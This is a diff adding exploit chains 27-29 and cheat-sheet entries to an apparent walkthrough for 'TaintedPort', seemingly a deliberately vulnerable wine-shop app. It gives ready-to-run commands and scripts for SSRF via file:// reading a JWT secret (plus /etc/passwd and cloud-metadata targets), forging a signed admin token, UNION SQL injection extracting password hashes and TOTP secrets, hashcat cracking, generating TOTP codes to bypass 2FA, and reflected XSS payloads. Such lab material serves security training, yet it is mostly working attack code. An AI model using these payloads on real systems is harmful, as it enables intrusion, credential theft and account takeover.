@@ -643,6 +643,195 @@ How it works:
   including "is_admin": true in their JSON payload.
 
 
+------------------------------------------------------------
+27. SSRF VIA WINE IMPORT URL -> JWT SECRET -> ADMIN FORGERY
+------------------------------------------------------------
+
+This is a multi-step exploit chain that uses SSRF to extract the JWT
+secret, then forges a properly signed admin token.
+
+Step 1 - Login as any user to get a valid JWT:
+
+  TOKEN=$(curl -s -X POST https://api.taintedport.com/auth/login \
+    -H "Content-Type: application/json" \
+    -d '{"email":"joe@example.com","password":"password123"}' | \
+    python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
+
+Step 2 - Use SSRF to read the JWT configuration file:
+
+  curl -s -X POST https://api.taintedport.com/wines/import-url \
+    -H "Content-Type: application/json" \
+    -H "Authorization: Bearer $TOKEN" \
+    -d '{"url": "file:///var/www/backend/api/config/jwt.php"}'
+
+Expected response (raw_content contains the PHP source with the secret):
+  {
+    "success": true,
+    "message": "Content fetched but is not valid JSON wine data.",
+    "raw_content": "<?php\n\nclass JWT {\n    private static $secret = 'pTg7Kz9mQxR4vL2wN8jF5dY1hA6cB3eS0uI';\n    ...",
+    "url": "file:///var/www/backend/api/config/jwt.php"
+  }
+
+Step 3 - Extract the secret and forge a properly signed admin JWT:
+
+  python3 -c "
+  import json, base64, hmac, hashlib, time
+
+  secret = 'pTg7Kz9mQxR4vL2wN8jF5dY1hA6cB3eS0uI'
+
+  def b64url(data):
+      return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
+
+  header = b64url(json.dumps({'alg':'HS256','typ':'JWT'}).encode())
+  payload = b64url(json.dumps({
+      'user_id': 1,
+      'email': 'joe@example.com',
+      'is_admin': True,
+      'iat': int(time.time()),
+      'exp': 9999999999
+  }).encode())
+  sig = b64url(hmac.new(secret.encode(), f'{header}.{payload}'.encode(), hashlib.sha256).digest())
+
+  print(f'{header}.{payload}.{sig}')
+  "
+
+Step 4 - Use the forged (properly signed) token to access admin endpoints:
+
+  FORGED_TOKEN="<output from step 3>"
+
+  curl -s https://api.taintedport.com/admin/orders \
+    -H "Authorization: Bearer $FORGED_TOKEN" | python3 -m json.tool
+
+How it works:
+  Unlike chain #23 (which uses alg=none or exploits the signature bypass),
+  this chain extracts the real JWT secret via SSRF and creates a token with
+  a valid HS256 signature. This means the forged token would pass even a
+  correctly implemented signature check. The chain is:
+  SSRF (read local file) -> secret extraction -> token forgery -> admin access.
+
+Other SSRF targets:
+  {"url": "file:///var/www/backend/database.db"}     - SQLite database
+  {"url": "file:///var/www/backend/setup_db.php"}     - DB schema and seed data
+  {"url": "file:///etc/passwd"}                       - System users
+  {"url": "http://169.254.169.254/latest/meta-data/"} - Cloud metadata (if on AWS)
+
+
+------------------------------------------------------------
+28. SQLi -> TOTP SECRET EXTRACTION -> 2FA BYPASS -> ACCOUNT TAKEOVER
+------------------------------------------------------------
+
+This is a multi-step exploit chain that uses SQL injection to extract
+TOTP secrets, then generates valid 2FA codes to take over accounts
+that have two-factor authentication enabled.
+
+Step 1 - Use SQLi to extract credentials and TOTP secrets:
+
+  Via wine search (8 columns — totp_secret in column 7):
+  curl -s "https://api.taintedport.com/wines?search=' UNION SELECT 1,email,password_hash,name,5,6,totp_secret,totp_enabled FROM users--"
+
+  Via wine reviews (5 columns — totp_secret in column 4):
+  curl -s "https://api.taintedport.com/wines/0 UNION SELECT 1,email,password_hash,totp_secret,totp_enabled FROM users--/reviews"
+
+Expected response (wine search) includes user data as wine fields:
+  {
+    "wines": [
+      {
+        "name": "joe@example.com",
+        "region": "$2y$10$...",       <-- password_hash
+        "type": "Joe Silva",
+        "image_url": "JBSWY3DP...",  <-- totp_secret (if 2FA enabled)
+        "description_short": "1"     <-- totp_enabled
+      },
+      ...
+    ]
+  }
+
+Step 2 - Crack the password hash (weak passwords):
+
+  The passwords are bcrypt hashes. For weak passwords like "password123",
+  a dictionary attack cracks them in seconds:
+    hashcat -m 3200 '$2y$10$...' rockyou.txt
+
+Step 3 - Generate a valid TOTP code using the stolen secret:
+
+  python3 -c "
+  import hmac, hashlib, struct, time
+
+  secret_b32 = 'JBSWY3DPEHPK3PXP'  # from SQLi extraction
+  # Decode base32
+  import base64
+  key = base64.b32decode(secret_b32)
+
+  # Generate TOTP
+  counter = struct.pack('>Q', int(time.time()) // 30)
+  h = hmac.new(key, counter, hashlib.sha1).digest()
+  offset = h[-1] & 0x0F
+  code = (struct.unpack('>I', h[offset:offset+4])[0] & 0x7FFFFFFF) % 1000000
+  print(f'{code:06d}')
+  "
+
+  Or with the pyotp library:
+    python3 -c "import pyotp; print(pyotp.TOTP('JBSWY3DPEHPK3PXP').now())"
+
+Step 4 - Login as the victim with password + TOTP code:
+
+  curl -X POST https://api.taintedport.com/auth/login \
+    -H "Content-Type: application/json" \
+    -d '{
+      "email": "victim@example.com",
+      "password": "password123",
+      "totp_code": "<code from step 3>"
+    }'
+
+How it works:
+  Two-factor authentication is supposed to protect accounts even when
+  passwords are compromised. However, TaintedPort stores the TOTP shared
+  secret in the same database as the credentials. Since SQL injection
+  allows extracting arbitrary columns, an attacker can steal both the
+  password hash AND the TOTP secret in a single query. With the secret,
+  they can generate valid TOTP codes at will, completely nullifying the
+  second factor. The chain is:
+  SQLi (extract creds + TOTP secret) -> password crack -> TOTP generation -> login with 2FA.
+
+
+------------------------------------------------------------
+29. REFLECTED XSS - CONTACT FORM PREVIEW (SERVER-SIDE)
+------------------------------------------------------------
+
+Unlike the other XSS vulns (which are DOM-based via dangerouslySetInnerHTML),
+this is a traditional server-side reflected XSS where PHP generates HTML
+with unsanitized user input.
+
+Payload (via curl - form-encoded POST):
+  curl -X POST https://api.taintedport.com/contact/preview \
+    -d 'name=<script>alert(document.cookie)</script>&email=test@test.com&subject=Test&message=Hello'
+
+Payload (via curl - XSS in all fields):
+  curl -X POST https://api.taintedport.com/contact/preview \
+    -d 'name=<img src=x onerror=alert("name")>&email=<img src=x onerror=alert("email")>&subject=<img src=x onerror=alert("subject")>&message=<img src=x onerror=alert("message")>'
+
+Payload (via HTML form - paste into browser console):
+  var f = document.createElement('form');
+  f.method = 'POST';
+  f.action = 'https://api.taintedport.com/contact/preview';
+  ['name', 'email', 'subject', 'message'].forEach(function(n) {
+    var i = document.createElement('input');
+    i.name = n;
+    i.value = '<img src=x onerror=alert("' + n + '")>';
+    f.appendChild(i);
+  });
+  document.body.appendChild(f);
+  f.submit();
+
+How it works:
+  The /contact page has a form that POSTs to /contact/preview. The PHP
+  backend renders an HTML confirmation page with the form values embedded
+  directly in the HTML using string interpolation ($name, $email, etc.)
+  without calling htmlspecialchars(). The browser receives the HTML with
+  the injected script tags/event handlers and executes them. This is
+  the classic reflected XSS pattern: user input -> server -> HTML -> browser.
+
+
 ============================================================
   CHEAT SHEET - Quick Copy-Paste Payloads
 ============================================================
@@ -671,3 +860,7 @@ Priv esc (register):     {"name":"x","email":"x@x.com","password":"password123",
 Priv esc (JWT forge):    eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJlbWFpbCI6ImpvZUBleGFtcGxlLmNvbSIsImlzX2FkbWluIjp0cnVlLCJleHAiOjk5OTk5OTk5OTl9.
 BOPLA (order leak):      GET /orders/3 → owner_password_hash, owner_totp_secret
 BFLA (order status):     {"is_admin": true, "status": "cancelled"}
+SSRF (file read):        {"url": "file:///var/www/backend/api/config/jwt.php"}
+SSRF (database):         {"url": "file:///var/www/backend/database.db"}
+SQLi TOTP extraction:    ' UNION SELECT 1,email,password_hash,name,5,6,totp_secret,totp_enabled FROM users--
+XSS contact (reflected): name=<script>alert(document.cookie)</script> (POST /contact/preview)
